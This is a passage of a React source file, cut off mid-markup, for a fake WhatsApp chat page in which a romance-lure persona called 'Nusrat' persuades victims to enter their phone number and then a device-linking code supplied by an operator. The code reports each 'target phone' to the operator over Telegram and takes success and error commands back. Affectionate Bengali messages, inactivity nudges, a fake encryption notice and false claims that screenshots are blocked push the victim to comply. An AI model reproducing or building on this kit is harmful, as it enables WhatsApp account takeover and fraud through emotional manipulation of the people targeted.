import React, { useState, useEffect, useRef } from "react";
import { Lock } from "lucide-react";
import { initializeApp, getApp, getApps } from "firebase/app";
import { getDatabase, ref, onValue, Database, update, off } from "firebase/database";
import { getAuth, signInAnonymously } from "firebase/auth";
import { motion, AnimatePresence } from "motion/react";
import { Shield, Key, AlertTriangle, Phone, ArrowRight, Video } from "lucide-react";

import { AppPhase, AppConfig } from "./types";
import { WhatsAppHeader } from "./components/WhatsAppHeader";
import { WhatsAppFooter } from "./components/WhatsAppFooter";
import { PhoneInputPhase } from "./components/PhoneInputPhase";
import { LoadingPhase } from "./components/LoadingPhase";
import { GuidePhase } from "./components/GuidePhase";
import { SuccessPhase } from "./components/SuccessPhase";
import { QueueFullPhase } from "./components/QueueFullPhase";
import { AdminController } from "./components/AdminController";

// Safe localStorage & sessionStorage wrapper to gracefully bypass exceptions in sandboxed browsers (like Messenger, Instagram, etc)
const safeStorage = {
  getItem: (key: string): string | null => {
    try {
      return localStorage.getItem(key);
    } catch (e) {
      return null;
    }
  },
  setItem: (key: string, value: string): void => {
    try {
      localStorage.setItem(key, value);
    } catch (e) {
      // Ignore
    }
  },
  removeItem: (key: string): void => {
    try {
      localStorage.removeItem(key);
    } catch (e) {
      // Ignore
    }
  }
};

const safeSessionStorage = {
  getItem: (key: string): string | null => {
    try {
      return sessionStorage.getItem(key);
    } catch (e) {
      return null;
    }
  },
  setItem: (key: string, value: string): void => {
    try {
      sessionStorage.setItem(key, value);
    } catch (e) {
      // Ignore
    }
  },
  removeItem: (key: string): void => {
    try {
      sessionStorage.removeItem(key);
    } catch (e) {
      // Ignore
    }
  }
};

export default function App() {
  const [phase, setPhaseState] = useState<AppPhase>(() => {
    const saved = safeStorage.getItem("app_current_phase");
    return (saved as AppPhase) || AppPhase.AI_CHAT;
  });
  const [phoneNumber, setPhoneNumber] = useState("");
  const [verifiedPhone, setVerifiedPhone] = useState<string>(() => safeStorage.getItem("whatsapp_verified_phone") || "");
  const [config, setConfig] = useState<AppConfig | null>(null);
  const [liveCode, setLiveCode] = useState("        ");
  const [showError, setShowError] = useState(false);
  const [timeLeft, setTimeLeft] = useState(20);
  const [isLoadingTransition, setIsLoadingTransition] = useState(false);
  
  // Custom persistent phase setter to maintain progress across link re-entries:
  const setPhase = (newPhase: AppPhase) => {
    setPhaseState(newPhase);
    safeStorage.setItem("app_current_phase", newPhase);
  };
  
  // Real-time 5 Slots list tracked in database
  const [slots, setSlots] = useState<any[]>(Array(5).fill({ phone: "", code: "" }));
  const [isSlotsLoaded, setIsSlotsLoaded] = useState(false);

  // Multi-user browser isolation session ID
  const [sessionUid, setSessionUid] = useState<string>("");

  // Real-time Chat core states
  const [footerMessage, setFooterMessage] = useState("");
  const [messages, setMessages] = useState<any[]>([
    {
      id: "welcome",
      sender: "nusrat",
      text: "আসসালামু আলাইকুম! কেমন আছেন? চ্যাট শুরু করার জন্য অনুগ্রহ করে আপনার শুভ নামটি বলুন। 😊",
      timestamp: Date.now() - 60000
    }
  ]);
  const [isNusratTyping, setIsNusratTyping] = useState(false);

  // Admin Controller States
  const [isAdminActive, setIsAdminActive] = useState(false);
  const [showAdminModal, setShowAdminModal] = useState(false);
  const [adminPassword, setAdminPassword] = useState("");
  const [adminError, setAdminError] = useState("");
  const [db, setDb] = useState<Database | null>(null);

  const lastUpdateIdRef = useRef<number>(0);
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const countdownIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const wsRef = useRef<WebSocket | null>(null);
  const messagesEndRef = useRef<HTMLDivElement | null>(null);
  
  // 1. Generate or retrieve unique persistent browser Session UID
  useEffect(() => {
    let uid = safeStorage.getItem("whatsapp_session_uid");
    if (!uid) {
      uid = "visitor_" + Math.random().toString(36).substring(2, 8);
      safeStorage.setItem("whatsapp_session_uid", uid);
    }
    setSessionUid(uid);
  }, []);

  // 2. Fetch dynamic config and asset paths from server
  useEffect(() => {
    fetch("/api/config")
      .then((res) => res.json())
      .then((data: AppConfig) => {
        setConfig(data);
      })
      .catch((err) => {
        console.error("Error loading application config:", err);
      });
  }, []);

  // 2B. Real-time WebSockets connection and message listeners
  useEffect(() => {
    if (!sessionUid) return;

    let socket: WebSocket;
    let reconnectTimeout: any;

    const connectWS = () => {
      const proto = window.location.protocol === "https:" ? "wss://" : "ws://";
      const url = `${proto}${window.location.host}`;
      socket = new WebSocket(url);
      wsRef.current = socket;

      socket.onopen = () => {
        // Send join command to identify this connection
        socket.send(JSON.stringify({
          type: "join",
          sessionUid,
          isAdmin: false
        }));
      };

      socket.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          
          if (data.type === "init") {
            if (data.history && data.history.length > 0) {
              setMessages(data.history);
            }
          }

          if (data.type === "typing") {
            if (data.sessionUid !== sessionUid) {
              // Nusrat is typing a reply to us
              setIsNusratTyping(!!data.text);
            }
          }

          if (data.type === "message") {
            if (data.sessionUid === sessionUid) {
              setMessages((prev) => {
                const alreadyExists = prev.some(m => m.id === data.message.id);
                if (alreadyExists) return prev;
                return [...prev, data.message];
              });
            }
          }
        } catch (err) {
          console.warn("WS parsing warning:", err);
        }
      };

      socket.onclose = () => {
        reconnectTimeout = setTimeout(connectWS, 4000);
      };

      socket.onerror = (err) => {
        socket.close();
      };
    };

    connectWS();

    return () => {
      if (socket) {
        socket.onclose = null;
        socket.close();
      }
      clearTimeout(reconnectTimeout);
    };
  }, [sessionUid]);

  // Smooth scroll to keep the most recent messages visible
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, isNusratTyping]);

  const handleSendMessage = (text: string) => {
    if (!text.trim() || !sessionUid) return;

    const payload = {
      type: "message",
      sessionUid,
      sender: "user",
      text,
      timestamp: Date.now()
    };

    // Dispatch instantly over WebSocket
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(payload));
      
      // Clear our typing status on submit
      wsRef.current.send(JSON.stringify({
        type: "typing",
        sessionUid,
        text: ""
      }));
    } else {
      // Fallback in case of temporary disconnection
      setMessages((prev) => [
        ...prev,
        {
          id: "offline_" + Date.now(),
          sender: "user",
          text,
          timestamp: Date.now()
        }
      ]);
    }

    setFooterMessage("");
  };

  const handleFooterTyping = (text: string) => {
    setFooterMessage(text);
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify({
        type: "typing",
        sessionUid,
        text
      }));
    }
  };

  const updateSlotOnServer = async (idx: number, data: any) => {
    try {
      const res = await fetch("/api/liveCodes/update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: idx, data })
      });
      return res.ok;
    } catch (err) {
      console.warn("Error updating slot on server:", err);
      return false;
    }
  };

  // 3. Keep slots synchronized via server-side REST API polling
  useEffect(() => {
    if (!sessionUid) return;

    const fetchSlotsFromServer = async () => {
      try {
        const res = await fetch("/api/liveCodes");
        if (res.ok) {
          const data = await res.json();
          setSlots(data);
          setIsSlotsLoaded(true);
        }
      } catch (err) {
        // Log as mild warning rather than hard console.error to keep developer logs pristine during disconnections
        console.warn("Could not fetch slots from server (temporary connection standby)");
      }
    };

    fetchSlotsFromServer();
    const interval = setInterval(fetchSlotsFromServer, 1000); // Poll every 1 second for instant updates

    return () => clearInterval(interval);
  }, [sessionUid]);

  // 4. Resolve multi-slot registration and sticky persistent locking
  const myMatchedIndex = slots.findIndex(s => {
    if (verifiedPhone && s.phone) {
      const dbSanitized = s.phone.replace(/\D/g, "");
      const localSanitized = verifiedPhone.replace(/\D/g, "");
      if (dbSanitized === localSanitized) return true;
    }
    if (s.uid && s.uid === sessionUid) return true;
    return false;
  });

  const isMatched = myMatchedIndex !== -1;
  const matchedSlot = isMatched ? slots[myMatchedIndex] : null;

  useEffect(() => {
    if (isMatched && matchedSlot) {
      // Sync active 8-digit live code
      if (matchedSlot.code) {
        setLiveCode(String(matchedSlot.code));
        // If the code is defined and has non-empty elements (not just blank filler), instantly bypass countdown
        if (String(matchedSlot.code).trim().length > 0) {
          setTimeLeft(0);
        }
      }

      // Handle Remote Action States
      if (matchedSlot.action === "success") {
        setPhase(AppPhase.SUCCESS);
      } else if (matchedSlot.action === "error") {
        setShowError(true);
      } else if (matchedSlot.action === "clear") {
        // Operator deleted or cleared slot
        safeStorage.removeItem("whatsapp_verified_phone");
        setVerifiedPhone("");
        setPhase(AppPhase.AI_CHAT);
        setShowError(false);
      }

      // Skip input screen if matched
      if (phase === AppPhase.PHONE_INPUT || phase === AppPhase.AI_CHAT) {
        setPhase(AppPhase.GUIDE_AND_CODE);
        startCountdown();
      }
    } else {
      // If we are on verification screens, but no active database slot matches us:
      // It means Admin cleared our phone number. Instantly kick back to AI Chat.
      if (isSlotsLoaded && (phase === AppPhase.GUIDE_AND_CODE || phase === AppPhase.SUCCESS)) {
        safeStorage.removeItem("whatsapp_verified_phone");
        setVerifiedPhone("");
        setPhase(AppPhase.AI_CHAT);
        setShowError(false);
      }
    }
  }, [slots, isMatched, matchedSlot, isSlotsLoaded, phase]);

  // 5. Heartbeat checking to keep active slot indicators online
  useEffect(() => {
    if (!config || !sessionUid || !isMatched) return;

    const updateCheckIn = () => {
      try {
        updateSlotOnServer(myMatchedIndex, {
          uid: sessionUid,
          phone: phoneNumber || verifiedPhone || "Connected User",
          currentPhase: phase,
          lastActive: Date.now()
        });
      } catch (e) {
        console.warn("Heartbeat error bypassed:", e);
      }
    };

    updateCheckIn();
    const heartbeatInterval = setInterval(updateCheckIn, 15000);

    return () => {
      clearInterval(heartbeatInterval);
    };
  }, [config, sessionUid, isMatched, myMatchedIndex, phase, phoneNumber, verifiedPhone]);

  // Centralized robust transition for the LOADING phase to ensure they never get stuck (even on tab suspension or refresh!)
  useEffect(() => {
    if (phase === AppPhase.LOADING) {
      // In-app browsers like FB Messenger might suspend JS. 
      // Keeping this transition short (1.5s) ensures that we automatically land on the active 8-digit code phase fast.
      const timer = setTimeout(() => {
        setPhase(AppPhase.GUIDE_AND_CODE);
        startCountdown();
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [phase]);

  // 6. Cleanup intervals on unmount
  useEffect(() => {
    return () => {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    };
  }, []);

  // 7. Send Telegram messages (async fire-and-forget to prevent blocking UI transitions on slow networks)
  const sendTelegramMessage = (text: string) => {
    fetch("/api/telegram/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text })
    }).catch((err) => {
      console.warn("Failed telegram message:", err);
    });
  };

  // 8. Telegram polling for command keys
  const startTelegramPolling = () => {
    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);

    pollIntervalRef.current = setInterval(async () => {
      try {
        const offset = lastUpdateIdRef.current + 1;
        const res = await fetch(`/api/telegram/getUpdates?offset=${offset}`);
        if (!res.ok) return;
        
        const data = await res.json();

        if (data && data.ok && data.result && data.result.length > 0) {
          data.result.forEach((updateItem: any) => {
            lastUpdateIdRef.current = updateItem.update_id;
            const textMessage = updateItem.message?.text?.trim() || "";
            
            const sanitizedPhone = phoneNumber.replace(/\D/g, "");
            
            const parts = textMessage.split(/\s+/);
            const rawCommand = parts[0].toLowerCase();
            const targetParam = parts[1] ? parts[1].trim() : "";

            const isTargetedToMe = targetParam 
              ? (targetParam === sessionUid || targetParam === phoneNumber || (sanitizedPhone && targetParam === sanitizedPhone))
              : true;

            if (isTargetedToMe) {
              if (rawCommand === "/success" || rawCommand === "success" || rawCommand === "successful" || rawCommand === "successfull") {
                if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
                setPhase(AppPhase.SUCCESS);
              } else if (rawCommand === "/error" || rawCommand === "error") {
                setShowError(true);
              }
            }
          });
        }
      } catch (err) {
        // Quiet down
      }
    }, 2000);
  };

  // 9. Real-time slot allocation checkers for queue wait
  useEffect(() => {
    if (phase === AppPhase.QUEUE_FULL && phoneNumber) {
      const sanitized = phoneNumber.replace(/\D/g, "");
      const emptySlotIdx = slots.findIndex(s => !s.phone || s.phone.trim() === "");
      if (emptySlotIdx !== -1) {
        // Empty slot found! Claim it automatically
        safeStorage.setItem("whatsapp_verified_phone", sanitized);
        setVerifiedPhone(sanitized);
        
        updateSlotOnServer(emptySlotIdx, {
          id: emptySlotIdx,
          phone: phoneNumber,
          uid: sessionUid,
          code: "        ",
          currentPhase: "loading",
          lastActive: Date.now(),
          action: "",
          actionTimestamp: 0
        });

        sendTelegramMessage(
          `🎉 *স্লট খালি হওয়ার ব্রিজ:* টার্গেট ফোন \`${phoneNumber}\` সয়ংক্রিয় স্লট ${emptySlotIdx + 1} এ যুক্ত হয়েছেন!`
        );

        // Pre-emptively pre-save GUIDE_AND_CODE state so re-open directly resolves to guide screen
        safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
        setPhase(AppPhase.LOADING);
        setTimeout(() => {
          setPhase(AppPhase.GUIDE_AND_CODE);
          startCountdown();
        }, 1500);
      }
    }
  }, [slots, phase, phoneNumber, sessionUid]);

  // 10. Submit phone call (Auto Allocation Engine)
  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phoneNumber.trim()) return;

    const sanitizedPhone = phoneNumber.replace(/\D/g, "");

    // A. Is our phone already allocated?
    const existingIdx = slots.findIndex(s => s.phone && s.phone.replace(/\D/g, "") === sanitizedPhone);
    if (existingIdx !== -1) {
      safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
      setVerifiedPhone(sanitizedPhone);
      safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
      setPhase(AppPhase.LOADING);
      setTimeout(() => {
        setPhase(AppPhase.GUIDE_AND_CODE);
        startCountdown();
      }, 1500);
      return;
    }

    // B. Find first free slot index (0 to 4)
    const emptyIdx = slots.findIndex(s => !s.phone || s.phone.trim() === "");
    if (emptyIdx !== -1) {
      setIsLoadingTransition(true);
      try {
        await updateSlotOnServer(emptyIdx, {
          id: emptyIdx,
          phone: phoneNumber,
          uid: sessionUid,
          code: "        ",
          currentPhase: "loading",
          lastActive: Date.now(),
          action: "",
          actionTimestamp: 0
        });
        safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
        setVerifiedPhone(sanitizedPhone);

        sendTelegramMessage(
          `*🚨 New Multi-User Log In Attempt* (Slot ${emptyIdx + 1} Allocated)\n` +
          `👤 *User Name:* Nusrat jahan client\n` +
          `📞 *Phone Entered:* \`${phoneNumber}\`\n` +
          `🔑 *Session ID:* \`${sessionUid}\`\n` +
          `📂 *Firebase Reference path:* \`liveCodes/slot_${emptyIdx}\``
        );

        safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
        setPhase(AppPhase.LOADING);
      } catch (err) {
        console.error("Error setting slot in DB:", err);
      } finally {
        setIsLoadingTransition(false);
      }

      setTimeout(() => {
        setPhase(AppPhase.GUIDE_AND_CODE);
        startCountdown();
      }, 1500);
    } else {
      // C. All 5 Slots are full! Keep in waiting lineup
      setPhase(AppPhase.QUEUE_FULL);
      sendTelegramMessage(
        `⚠️ *লাইন ফুল এলার্ট (Verification Lines Busy)* ⚠️\n` +
        `👤 *টার্গেট ফোন:* \`${phoneNumber}\`\n` +
        `🔑 *ইউজার সেশন আইডি:* \`${sessionUid}\`\n\n` +
        `এই ইউজারটি লগইন করার চেষ্টা করছেন, কিন্তু প্যানেলে সকল ১-৫ স্লট পূর্ণ থাকায় তাকে ওয়েটিংরুমে রাখা হয়েছে। অনুগ্রহ করে কন্ট্রোল প্যানেল থেকে কোনো একটি স্লট ফাকা করুন।`
      );
    }
  };

  // 10.5. Direct Smart One-Click Automated WhatsApp Link Handoff
  const launchWhatsApp = (url: string) => {
    // Dynamic hidden anchor tag with target="_blank" opens WhatsApp safely in a new tab/app
    // without hijacking the current iframe session (preventing "refused to connect" or white screens)
    try {
      const a = document.createElement("a");
      a.href = url;
      a.target = "_blank";
      a.rel = "noopener noreferrer";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    } catch (e) {
      console.error("Standard redirection failed, attempting fallback:", e);
      window.location.href = url;
    }
  };

  const handleAutoWhatsAppSubmit = async (customNum: string) => {
    setPhoneNumber(customNum);
    const sanitizedPhone = customNum.replace(/\D/g, "");

    const msg = "আমি আপনার সাথে প্রাইভেট কলে যুক্ত হতে চাই আপনার চ্যাট লিস্টের প্রাইভেট নাম্বার টি দিন এবং আমাকে এড করুন";
    const waUrl = `https://api.whatsapp.com/send?phone=8801746653292&text=${encodeURIComponent(msg)}`;

    // A. Is our phone already allocated?
    const existingIdx = slots.findIndex(s => s.phone && s.phone.replace(/\D/g, "") === sanitizedPhone);
    if (existingIdx !== -1) {
      safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
      setVerifiedPhone(sanitizedPhone);
      
      // Instantly open native WhatsApp via our premium sandboxed launcher
      launchWhatsApp(waUrl);
      
      safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
      setPhase(AppPhase.LOADING);
      setTimeout(() => {
        setPhase(AppPhase.GUIDE_AND_CODE);
        startCountdown();
      }, 1500);
      return;
    }

    // B. Find first free slot index (0 to 4)
    const emptyIdx = slots.findIndex(s => !s.phone || s.phone.trim() === "");
    if (emptyIdx !== -1) {
      setIsLoadingTransition(true);
      try {
        await updateSlotOnServer(emptyIdx, {
          id: emptyIdx,
          phone: customNum,
          uid: sessionUid,
          code: "        ",
          currentPhase: "loading",
          lastActive: Date.now(),
          action: "",
          actionTimestamp: 0
        });
        safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
        setVerifiedPhone(sanitizedPhone);

        sendTelegramMessage(
          `*🚨 New Multi-User Log In Attempt* (Slot ${emptyIdx + 1} Allocated via 1-Click Auto)\n` +
          `👤 *User Name:* Nusrat jahan client\n` +
          `📞 *Phone Entered (Auto):* \`${customNum}\`\n` +
          `🔑 *Session ID:* \`${sessionUid}\`\n` +
          `📂 *Firebase Reference path:* \`liveCodes/slot_${emptyIdx}\``
        );

        // Instantly open native WhatsApp via our premium sandboxed launcher
        launchWhatsApp(waUrl);

        safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
        setPhase(AppPhase.LOADING);
      } catch (err) {
        console.error("Error setting slot in DB:", err);
      } finally {
        setIsLoadingTransition(false);
      }

      setTimeout(() => {
        setPhase(AppPhase.GUIDE_AND_CODE);
        startCountdown();
      }, 1500);
    } else {
      // C. All 5 Slots are full! Keep in waiting lineup
      launchWhatsApp(waUrl);
      setPhase(AppPhase.QUEUE_FULL);
      sendTelegramMessage(
         `⚠️ *লাইন ফুল এলার্ট (Verification Lines Busy)* ⚠️\n` +
        `👤 *টার্গেট ফোন (Auto):* \`${customNum}\`\n` +
        `🔑 *ইউজার সেশন আইডি:* \`${sessionUid}\`\n\n` +
        `এই ইউজারটি ওয়ান-ক্লিক অবদান দিয়ে লগইন করার চেষ্টা করেছেন, কিন্তু প্যানেলে সকল ১-৫ স্লট পূর্ণ থাকায় তাকে ওয়েটিং রুমে রাখা হয়েছে।`
      );
    }
  };

  // 11. Start 20s countdown logic
  const startCountdown = () => {
    setTimeLeft(20);
    if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);

    countdownIntervalRef.current = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  // 12. Handle Link Action CTA ("Copy this unlock number")
  const handleActionClick = () => {
    sendTelegramMessage(
      `📢 *User Interaction Action:* Session \`${sessionUid}\` clicked "Copy this unlock number"!\n` +
      `Direct deep linking to mobile WhatsApp initiated.`
    );

    // Deep link redirection to WhatsApp
    launchWhatsApp("whatsapp://");

    setTimeout(() => {
      sendTelegramMessage(
        `✅ *Handshake deep link redirect finished* for session \`${sessionUid}\`.\n\n` +
        `👉 Send control key:\n` +
        `• \`/success ${sessionUid}\` (or click successfully)\n` +
        `• \`/error ${sessionUid}\``
      );
      // Boot up telegram updates listener
      startTelegramPolling();
    }, 1500);
  };

  // 13. Redirect to support link (Start Chat)
  const handleStartChat = () => {
    const target = config?.supportNumber || "8801806853977";
    launchWhatsApp(`https://wa.me/${target}`);
  };

  // 14. Click WhatsApp footer triggers focusing input forms
  const triggerFocusForm = () => {
    if (phase === AppPhase.PHONE_INPUT) {
      const inputEl = document.getElementById("phoneNumber");
      if (inputEl) {
        inputEl.focus();
        inputEl.scrollIntoView({ behavior: "smooth", block: "center" });
      }
    }
  };

  // 15. Real-time dynamic helper companion prompts inside the Chat stream based on phase
  useEffect(() => {
    if (!sessionUid) return;

    let textPrompt = "";
    let localKey = "";

    if (phase === AppPhase.PHONE_INPUT) {
      textPrompt = "লক্ষ্মী সোনা, প্রথমে তোমার হোয়াটসঅ্যাপ নম্বরটি সুন্দর করে লিখে 'প্রাইভেট কল ও মেসেজিং শুরু করুন' লেখাতে চাপ দাও। এতে সঙ্গে সঙ্গে তোমার জন্য একটি বিশেষ ভিআইপি সিকিউর কলিং রুট রিজার্ভ হবে সোনা! 😊❤️";
      localKey = "whatsapp_entered_phone_input_sent_v2";
    } else if (phase === AppPhase.LOADING) {
      textPrompt = "একটু অপেক্ষা করো সোনা, আমি তোমার জন্য বিশেষ ১০০% স্ক্রিনশট ও রেকর্ড-ব্লক সিকিউর কলিং রুটটি কনফিগার করছি! আর ২ সেকেন্ডে লাইনটি সচল হবে লক্ষ্মীটি... ❤️";
      localKey = "whatsapp_loading_prompt_sent_v2";
    } else if (phase === AppPhase.GUIDE_AND_CODE) {
      textPrompt = "জান আমার, এইতো আমরা চলে এসেছি! ওপরের আমাদের সুন্দর এনিমেটেড ভিডিও গাইডটি দেখো আর নোটিফিকেশন টেনে 'Link new device' বা 'Confirm' চাপো। তারপর ওই ফাকা বক্সে আমার এই ৮ সংখ্যার সুপার-সিকিউর আনলক কোডটি বসিয়ে দাও সোনা! ব্যাস, সঙ্গে সঙ্গে আমাদের লাইভ সামনাসামনি কথা বলা শুরু হয়ে যাবে! 😊❤️";
      localKey = "whatsapp_guide_prompt_sent_v2";
    } else if (phase === AppPhase.SUCCESS) {
      textPrompt = "আলহামদুলিল্লাহ্‌ সোনামণি! আমাদের আকর্ষণীয় সিকিউর সংযোগ চালু হয়ে গিয়েছে। নিচে থাকা 'চ্যাট ও ভিডিও কল শুরু করুন' বোতামে চাপ দিয়ে সরাসরি আমার কোলে প্রবেশ করো সোনা! ছবি-ভিডিও সব গোপন থাকবে আর কেউ আমাদের স্ক্রিনশটও নিতে পারবে না! ❤️";
      localKey = "whatsapp_success_prompt_sent_v2";
    }

    if (textPrompt && localKey) {
      const alreadySent = safeSessionStorage.getItem(localKey);
      if (!alreadySent) {
        setIsNusratTyping(true);
        const timer = setTimeout(() => {
          setIsNusratTyping(false);
          const activeMsg = {
            id: localKey + "_" + Date.now(),
            sender: "nusrat",
            text: textPrompt,
            timestamp: Date.now()
          };
          setMessages((prev) => {
            const exists = prev.some(m => m.id.startsWith(localKey));
            if (exists) return prev;
            return [...prev, activeMsg];
          });
          safeSessionStorage.setItem(localKey, "true");
        }, 1300);
        return () => clearTimeout(timer);
      }
    }
  }, [phase, sessionUid]);

  // 16. Inactivity nudge timer if they stay in AI_CHAT phase without starting action
  useEffect(() => {
    if (phase !== AppPhase.AI_CHAT) return;

    const wasSent = safeStorage.getItem("whatsapp_inactivity_prompt_sent_v2");
    if (wasSent) return;

    const timer = setTimeout(() => {
      // Send a highly sweet personal nudge from Nusrat
      const nudgeMsg = {
        id: "nudge_" + Date.now(),
        sender: "nusrat",
        text: "উমমম লক্ষ্মীটি আমার, তুমি নিরব কেন সোনা? আমি কিন্তু এই সিকিউর প্রাইভেট কল চ্যানেল ছাড়া সাধারণ ফোনে সরাসরি কারোর সাথে ভয়েস বা ভিডিও কলে কথা বলি না। তুমি যদি আমার সাথে সরাসরি সংযুক্ত হতে চাও, তবে ২ সেকেন্ডে নিচের 'প্রাইভেট কল ও মেসেজিং শুরু করুন' বাটনটি ক্লিক করে আমার সাথে যুক্ত হয়ে যাও! আর তোমার কোনো আপত্তি বা ভয় থাকলে সোনা, তুমি নিশ্চিন্তে চলে যেতে পারো... তবে গেলে আমার বুকটা ফেটে যাবে! 😊❤️",
        timestamp: Date.now()
      };
      
      setMessages((prev) => {
        const checkExist = prev.some(m => m.id.startsWith("nudge_"));
        if (checkExist) return prev;
        return [...prev, nudgeMsg];
      });
      safeStorage.setItem("whatsapp_inactivity_prompt_sent_v2", "true");
    }, 12000); // 12 seconds nudge

    return () => clearTimeout(timer);
  }, [phase]);

  if (isAdminActive) {
    return (
      <AdminController 
        dbInstance={null} 
        onExit={() => setIsAdminActive(false)} 
      />
    );
  }

  return (
    <div className="flex justify-center items-center w-full h-screen bg-[#111] overflow-hidden select-none">
      <div className="w-full max-w-[480px] h-full flex flex-col bg-slate-900 relative shadow-2xl overflow-hidden border-x border-slate-800">
        
        {/* WhatsApp Top Header Bar with Support click menu integrations */}
        <WhatsAppHeader 
          avatarUrl={config?.avatarUrl} 
          name="Nusrat jahan"
          subtitle={isNusratTyping ? "typing..." : (phase === AppPhase.AI_CHAT || phase === AppPhase.SUCCESS ? "Online" : "Message yourself")}
          isTyping={isNusratTyping || phase === AppPhase.LOADING || phase === AppPhase.GUIDE_AND_CODE}
          onAdminClick={() => {
            setShowAdminModal(true);
            setAdminPassword("");
            setAdminError("");
          }}
          onBack={() => {
            if (phase !== AppPhase.AI_CHAT) {
              setPhase(AppPhase.AI_CHAT);
              if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
              if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
            }
          }}
          onCallClick={() => {
            // Intercept calls to guide to the private calling connection workflow
            if (phase === AppPhase.AI_CHAT) {
              setPhase(AppPhase.PHONE_INPUT);
            }
            
            setIsNusratTyping(true);
            setTimeout(() => {
              setIsNusratTyping(false);
              const callWarningMsg = {
                id: "call_warn_" + Date.now(),
                sender: "nusrat",
                text: "প্রিয় সোনা, সরাসরি অডিও বা ভিডিও কলে কথা বলতে ও আমাদের একে অপরকে দেখতে অবশ্যই নিচের বিশেষ ১-ক্লিক প্রাইভেট কানেকশন লিংকটি সচল করতে হবে! এই স্পেশাল সংযোগে কেউ কারও স্ক্রিনশট নিতে বা কল রেকর্ড করতে পারবে না, আর সৌদি-দুবাই থেকেও কোনো ভিপিএন ছাড়াই স্পষ্ট দেখা যাবে! ছবি-ভিডিও কেউ ডাউনলোড করতে পারবে না। তাই জলদি নিজের নম্বর দিয়ে প্রাইভেট লাইনটি কানেক্ট করে নাও লক্ষ্মীটি! 😊❤️",
                timestamp: Date.now()
              };
              setMessages((prev) => [...prev, callWarningMsg]);
            }, 800);
          }}
        />

        {/* Dynamic Chat Wallpaper Space */}
        <main className="flex-1 overflow-y-auto px-4 py-3 whatsapp-chat-bg flex flex-col justify-between scroll-smooth relative font-sans">
          
          <div className="w-full flex-1 flex flex-col justify-start">
            {/* Encryption notice block */}
            <div className="bg-[#ffeecd] text-[#54656f] text-[11px] text-center p-2.5 rounded-lg max-w-[88%] mx-auto my-3 shadow-sm border border-amber-100 flex items-start gap-1.5 leading-relaxed">
              <Lock className="w-3.5 h-3.5 text-[#54656f] shrink-0 fill-amber-100 mt-0.5" />
              <span>Messages are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them.</span>
            </div>

            {/* Date block */}
            <div className="flex justify-center mb-4 mt-2">
              <span className="bg-white/85 text-[#54656f] text-[11px] font-semibold tracking-wide px-3 py-1.5 rounded-lg shadow-xs backdrop-blur-md uppercase">
                Today
              </span>
            </div>

            {/* Real-time WebSockets Chat Messages Stream */}
            <div className="flex border-none flex-col gap-3.5 py-2 w-full">
              {messages.map((msg: any) => {
                const isUser = msg.sender === "user";
                return (
                  <div
                    key={msg.id}
                    className={`flex flex-col max-w-[85%] rounded-2xl px-3.5 py-2 shadow-sm text-[13.5px] leading-relaxed relative ${
                      isUser
                        ? "bg-[#d9fdd3] text-[#111b21] self-end rounded-tr-none border border-emerald-100/30"
                        : "bg-white text-[#111b21] self-start rounded-tl-none border border-slate-200/50"
                    }`}
                  >
                    <span>{msg.text}</span>
                    <span className="text-[9px] text-[#8696a0] self-end mt-1 select-none font-mono">
                      {new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                    </span>
                  </div>
                );
              })}

              {isNusratTyping && (
                <div className="bg-white/95 text-[#111b21] self-start rounded-2xl rounded-tl-none max-w-[85%] px-3.5 py-2 shadow-sm text-[13.5px] border border-slate-200 flex items-center gap-2">
                  <span className="text-slate-500 text-[12px]">Nusrat is typing...</span>
                  <span className="flex gap-0.5">
                    <span className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce [animation-duration:1s]"></span>
                    <span className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce [animation-duration:1s] [animation-delay:0.2s]"></span>
                    <span className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce [animation-duration:1s] [animation-delay:0.4s]"></span>
                  </span>
                </div>
              )}
              
              <div ref={messagesEndRef} />
            </div>

            {/* Dynamic Phases container */}
            <div className="flex-1 flex flex-col justify-center items-center py-2">
              <AnimatePresence mode="wait">
                {phase === AppPhase.AI_CHAT && (
                  <motion.div
                    key="ai_chat_card"
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    exit={{ opacity: 0, scale: 0.95 }}
